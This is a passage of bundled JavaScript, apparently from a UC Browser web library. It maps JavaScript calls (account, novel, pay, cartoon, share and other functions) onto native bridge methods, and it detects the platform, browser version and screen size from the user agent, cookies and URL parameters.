                a.exec('comment.setSendCommentPlaceHolder', e, i.ALL);
              }
            },
            account: {
              openLoginWindow: function(e) {
                a.exec('account.openLoginWindow', e, i.ALL);
              },
              getUserInfo: function(e) {
                a.exec('account.getUserInfo', e, i.ALL);
              },
              onAccountStateChange: function(e) {
                a.onEvent('account.onAccountStateChange', e, i.ALL);
              },
              thirdpartGetUserInfo: function(e) {
                a.exec('account.thirdpartGetUserInfo', e, i.IPHONE);
              }
            },
            ucmap: {
              launchUCMap: function(e) {
                a.exec('ucmap.launchUCMap', e, i.ALL);
              },
              config: function(e) {
                a.exec('ucmap.config', e, i.ALL);
              }
            },
            novel: {
              getUserInfo: function(e) {
                a.exec('novel.getUserInfo', e, i.ALL);
              },
              openRechargePanel: function(e) {
                a.exec('novel.openRechargePanel', e, i.ANDROID);
              },
              openBatchBuyPanel: function(e) {
                a.exec('novel.openBatchBuyPanel', e, i.ANDROID);
              },
              updateProgressData: function(e) {
                a.exec('novel.updateProgressData', e, i.ALL);
              },
              addToBookshelf: function(e) {
                a.exec('novel.addToBookshelf', e, i.ALL);
              },
              getBookStatus: function(e) {
                a.exec('novel.getBookStatus', e, i.ALL);
              },
              getReadingConfig: function(e) {
                a.exec('novel.getReadingConfig', e, i.ALL);
              },
              setReadingConfig: function(e) {
                a.exec('novel.setReadingConfig', e, i.ALL);
              },
              stat: function(e) {
                a.exec('novel.stat', e, i.ALL);
              },
              notifySignProgress: function(e) {
                a.exec('novel.notifySignProgress', e, i.ALL);
              }
            },
            feedback: {
              getScreenshot: function(e) {
                a.exec('feedback.getScreenshot', e, i.ANDROID);
              }
            },
            mall: {
              missionDetail: function(e) {
                a.exec('mall.missionDetail', e, i.IPHONE);
              },
              doMission: function(e) {
                a.exec('mall.doMission', e, i.IPHONE);
              }
            },
            pay: {
              doPay: function(e) {
                a.exec('pay.doPay', e, i.ALL);
              },
              openOrderCenter: function(e) {
                a.exec('pay.openOrderCenter', e, i.ALL);
              },
              onPaymentStateChange: function(e) {
                a.onEvent('pay.onPaymentStateChange', e, i.ALL);
              }
            },
            cms: {
              executeAction: function(e) {
                a.exec('cms.executeAction', e, i.ALL);
              }
            },
            settings: {
              switchInputMethod: function(e) {
                a.exec('settings.switchInputMethod', e, i.ANDROID);
              }
            },
            smspring: {
              interactiveEvent: function(e) {
                a.exec('smspring.interactiveEvent', e, i.IPHONE);
              }
            },
            wemedia: {
              openHomePage: function(e) {
                a.exec('wemedia.openHomePage', e, i.ALL);
              },
              onFollow: function(e) {
                a.onEvent('wemedia.onFollow', e, i.ALL);
              },
              followWemedia: function(e) {
                a.exec('wemedia.followWemedia', e, i.ALL);
              },
              switchToGuide: function(e) {
                a.exec('wemedia.switchToGuide', e, i.ALL);
              },
              releaseStrategy: function(e) {
                a.exec('wemedia.releaseStrategy', e, i.ALL);
              },
              playVideo: function(e) {
                a.exec('wemedia.playVideo', e, i.ALL);
              },
              playVideoList: function(e) {
                a.exec('wemedia.playVideoList', e, i.ALL);
              },
              onPlayNextVideo: function(e) {
                a.onEvent('wemedia.onPlayNextVideo', e, i.ALL);
              },
              onPlayingVideoItem: function(e) {
                a.onEvent('wemedia.onPlayingVideoItem', e, i.ALL);
              }
            },
            smlbs: {
              locationEvent: function(e) {
                a.exec('smlbs.locationEvent', e, i.IPHONE);
              }
            },
            pp: {
              setNoBlock: function(e) {
                a.exec('pp.setNoBlock', e, i.ANDROID);
              }
            },
            notification: {
              getMsgBoxInfo: function(e) {
                a.exec('notification.getMsgBoxInfo', e, i.ANDROID);
              }
            },
            spam: {
              getActivityToken: function(e) {
                a.exec('spam.getActivityToken', e, i.ALL);
              },
              encrypt: function(e) {
                a.exec('spam.encrypt', e, i.ALL);
              },
              sign: function(e) {
                a.exec('spam.sign', e, i.ALL);
              }
            },
            activity: {
              playGameNotify: function(e) {
                a.exec('activity.playGameNotify', e, i.ALL);
              },
              onPlayGameCallback: function(e) {
                a.onEvent('activity.onPlayGameCallback', e, i.ALL);
              }
            },
            download: {
              downSilent: function(e) {
                a.exec('download.downSilent', e, i.ANDROID);
              }
            },
            picviewer: {
              open: function(e) {
                a.exec('picviewer.open', e, i.ALL);
              },
              onPageChange: function(e) {
                a.onEvent('picviewer.onPageChange', e, i.ALL);
              },
              notifyEvent: function(e) {
                a.exec('picviewer.notifyEvent', e, i.ALL);
              },
              onNotifyPosition: function(e) {
                a.onEvent('picviewer.onNotifyPosition', e, i.ALL);
              }
            },
            cartoon: {
              openReader: function(e) {
                a.exec('cartoon.openReader', e, i.ALL);
              },
              exitReader: function(e) {
                a.exec('cartoon.exitReader', e, i.ALL);
              },
              getReadRecord: function(e) {
                a.exec('cartoon.getReadRecord', e, i.ALL);
              },
              checkDownload: function(e) {
                a.exec('cartoon.checkDownload', e, i.ALL);
              },
              downLoad: function(e) {
                a.exec('cartoon.downLoad', e, i.ALL);
              },
              addFavorite: function(e) {
                a.exec('cartoon.addFavorite', e, i.ALL);
              },
              getFavorite: function(e) {
                a.exec('cartoon.getFavorite', e, i.ALL);
              },
              setReadingConfig: function(e) {
                a.exec('cartoon.setReadingConfig', e, i.ALL);
              },
              getReadingConfig: function(e) {
                a.exec('cartoon.getReadingConfig', e, i.ALL);
              },
              updateProgressData: function(e) {
                a.exec('cartoon.updateProgressData', e, i.ALL);
              },
              onPageIndexChange: function(e) {
                a.onEvent('cartoon.onPageIndexChange', e, i.ALL);
              },
              showToolbar: function(e) {
                a.exec('cartoon.showToolbar', e, i.ALL);
              }
            },
            window: {
              getWindowNumber: function(e) {
                a.exec('window.getWindowNumber', e, i.ANDROID);
              },
              openMultiWindowMenu: function(e) {
                a.exec('window.openMultiWindowMenu', e, i.ANDROID);
              }
            }
          };
        }),
        define('apiCompatibleImpl', function(e, t, n) {
          function i(e, t) {
            for (var n = '', i = e.split(','), o = 0; o < i.length; o++) {
              var a = i[o]
                , r = t[i[o]];
              r && (a = r),
                n = '' !== n ? n + ',' + a : a;
            }
            return n;
          }

          function o(e, t, n) {
            e && e.call(this, {
              errCode: t,
              errMsg: n
            });
          }

          var a = e('constant')
            , r = e('util')
            , c = e('bridge')
            , s = {
            QRcode: 'QRcodeGenerator'
          }
            , d = {
            SinaWeibo: 'kSinaWeibo',
            WechatFriends: 'kWeixin',
            WechatTimeline: 'kWeixinFriend',
            QQ: 'kQQ',
            Qzone: 'KQZone',
            QRcodeGenerator: 'QRcodeGenerator',
            DingDing: 'DingDing',
            ClipBoard: 'ClipBoard'
          };
          t.exec = function(e, t, n) {
            r.log(e, 'apiCompatibleImpl exec');
            var l;
            ucapi.invoke ? l = !0 : (o(t.fail, a.callbackStatus.INVALID_METHOD, 'ucapi.invoke not exsit, should load in UCBrowser !'),
              l = !1),
              l ? (l = r.getPlatform(),
                n !== a.platform.ALL && l !== n ? t && t.fail && o(t.fail, a.callbackStatus.INVALID_METHOD, 'this api not supported this platform') : ('biz.share' === e ? (r.getPlatform() == a.platform.ANDROID ? (t.sourceUrl && (t.url = t.sourceUrl,
                  delete t.sourceUrl),
                t.imageUrl && (t.image_url = t.imageUrl,
                  delete t.imageUrl),
                t.screenshotHtmlNodeId && ('' != t.screenshotHtmlNodeId && (l = r.getNodePosById(t.screenshotHtmlNodeId),
                '' != l && (l = l.join(',')),
                  t.share_rect = l),
                  delete t.screenshotHtmlNodeId),
                t.target && (t.target = i(t.target, s)),
                t.disableTarget && (t.invisible_platforms = i(t.disableTarget, s),
                  delete t.disableTarget),
                  window.ucweb.startRequest('shell.share', [JSON.stringify(t)])) : (t.screenshotHtmlNodeId && (t.htmlNode = t.screenshotHtmlNodeId,
                  delete t.screenshotHtmlNodeId),
                t.target && (t.target = i(t.target, d)),
                t.disableTarget && (t.disableTarget = i(t.disableTarget, d)),
                t.type && (t.shareStyle = 'img' === t.type ? 'shareImage' : t.type,
                  delete t.type),
                t.triggerFn && (t.jsCallBackFun = t.triggerFn,
                  delete t.triggerFn),
                  ucbrowser.web_shareEX(JSON.stringify(t))),
                  l = !0) : l = !1,
                l || c.exec(e, t, n))) : r.log(e, 'should load in UCBrowser');
          };
        });
      var apiDef = require('apidef')
        , util = require('util');
      window.ucapi && window.ucapi.debug && (window.onerror = function(e) {
          util.debugLog('onerror:' + e);
        }
      ),
        window.ucapi ? extenducapi() : window.ucapi = apiDef.ucapi;
    }(window);
  }
  , function(e, t) {
    var n = window._envi = {};
    !function(e, t) {
      function n(e) {
        switch (e) {
          case 'fr':
            return p.fr || g.name;
          case 'dn':
            return p.dn;
          case 'pr':
            return p.pr;
          case 'cp':
            return p.cp;
          case 'nt':
            return p.nt;
          case 've':
            return p.ve || i();
          case 'la':
            return p.la;
          case 'li':
            return p.li;
          case 'gi':
            return p.gi;
          case 'si':
            return p.si;
          case 'ei':
            return p.ei;
          case 'mi':
            return p.mi;
          case 'os':
            return p.os;
          case 'ss':
            return p.ss;
          case 'wi':
            return p.wi;
          case 'pi':
            return p.pi;
          case 'jb':
            return p.jb;
          case 'nw':
            return p.nw;
          case 'cu':
            return p.cu;
          case 'ni':
            return p.ni;
          case 'pf':
            return p.pf;
          case 'bi':
            return p.bi;
          case 'gd':
            return p.gd;
          case 'sv':
            return p.sv;
          case 'sHeight':
            return m.height || window.screen.availHeight;
          case 'sWidth':
            return m.width || window.screen.availWidth;
          case 'cHeight':
            return document.documentElement.clientHeight;
          case 'cWidth':
            return document.documentElement.clientWidth;
        }
      }

      function i() {
        var e, t = navigator.userAgent;
        if (t.indexOf('UCBrowser') > -1 ? e = /UCBrowser\/+((\d+\.){3}\d+)/ : t.indexOf('UCNewsApp') > -1 && (e = /UCNewsApp\/+((\d+\.){3}\d+)/),
            e)
          return t.match(e),
            RegExp.$1;
      }

      function o(e) {
        var t = (e || '').toLowerCase().split('x');
        return m.width = t[0],
          m.height = t[1],
          m;
      }

      function a(e) {
        var t = {
          iphone: 'iOS',
          ipad: 'iOS',
          apad: 'Android',
          aphone: 'Android',
          androidtv: 'Android'
        }
          , n = navigator.userAgent
          , i = n.match(/(Android)\s+([\d.]+)/)
          , o = n.match(/(iPad).*OS\s([\d_]+)/)
          , a = !o && n.match(/(iPhone\sOS)\s([\d_]+)/)
          , r = n.match(/(UCBrowser)/g)
          , c = n.match(/(UCNewsApp)/g)
          , s = n.match(/(Chrome)/g) && n.match(/(UCBrowser)/g);
        if (g.android = !1,
            g.ios = !1,
            g.iphone = !1,
            g.ipad = !1,
            g.aphone = !1,
            g.apad = !1,
            e) {
          g.name = t[e] || e;
          for (var d in t)
            g[d] = p.fr === d
        } else
          i && (g.name = 'android'),
          (o || a) && (g.name = 'iOS'),
          o && (g.ipad = !0),
          a && (g.name = 'iphone',
            g.iphone = !0);
        return r && !c && (g.ucBrowser = !0),
        c && (g.ucNewsApp = !0),
        s && (g.ucBrowserKernel = !0),
        i && (g.version = i[2] || ''),
        o && (g.version = o[2] ? o[2].replace(/_/g, '.') : ''),
        a && (g.version = a[2] ? a[2].replace(/_/g, '.') : ''),
          g.android = g.name && 'android' === g.name.toLowerCase(),
          g.ios = g.name && ('ios' === g.name.toLowerCase() || 'iphone' === g.name.toLowerCase()),
        !g.name && (g.name = ''),
          g;
      }

      function r(e) {
        var t = navigator.userAgent
          , n = t.match(/WebKit\/([\d.]+)/)
          , i = t.match(/UC[a-zA-Z]*?/)
          , o = t.match(/UC[a-zA-Z]*?\/([\d.]+)/);
        return h.version = null,
          h.uc = !1,
          h.ucNews = !1,
          h.safari = !1,
          h.webkit = !1,
          h.wechat = !1,
          h.qq = !1,
          h.weibo = !1,
          e ? h.version = e : i && o && (h.version = o[1]),
          h.uc = !!i,
          h.ucNews = !!/UCNewsApp/gi.test(t),
          h.webkit = !!n,
          h.safari = !!(t.match(/(iPhone|iPad)/) && t.match(/AppleWebKit/) && /safari\//gi.test(t)),
          h.wechat = !!/MicroMessenger/gi.test(t),
          h.qq = !!/MQQBrowser/gi.test(t),
          h.weibo = !!/weibo/gi.test(t),
          h;
      }

      function c() {
        var e = window.location.hash ? window.location.hash.match(/\#.*(?=\b|#)/) : window.location.search.match(/\?.*(?=\b|#)/);
        if (e && (e = e[0].replace(/^(\?|\#)/, '')),
            !e)
          return {};
        var t = {}
          , n = e.split('&');
        return _.each(n, function(e) {
          var n = e.split('=');
          t[n[0]] = n[1];
        }),
          t;
      }

      function s(e, t) {
        return _.each(t, function(t, n) {
          e.hasOwnProperty(n) && '' !== e[n] || (e[n] = t);
        }),
          e;
      }

      function d() {
        p = p || {},
          p = s(p, c()),
          m = o(p.ss),
          g = a(p.fr),
          h = r(p.ve);
      }

      var l = window._storage
        , u = window.ucapi
        , f = window._cookie
        , p = f.get('_uc_pramas') || {}
        , g = {}
        , h = {}
        , m = {
        width: 0,
        height: 0
      };
      if (_.isEmpty(p)) {
        var w = l.get('_uc_params_storage');
        p = w ? w : p,
          u.base.getVersion({
            success: function(e) {
              _.extend(p, {
                ve: e.ver,
                fr: e.platform,
                sv: e.subver
              }),
                l.remove('_uc_params_storage'),
                l.set('_uc_params_storage', p);
            }
          });
      }
      _.isString(p) && (p = JSON.parse(decodeURIComponent(p))),
        d(),
        t.get = n,
        t.detect = d,
        t.os = g,
        t.browser = h,
        e.get = n,
        e.detect = d,
        e.os = g,
        e.browser = h;
    }(window.__UCLIB__ || (window.__UCLIB__ = {}), n);
  }
]);
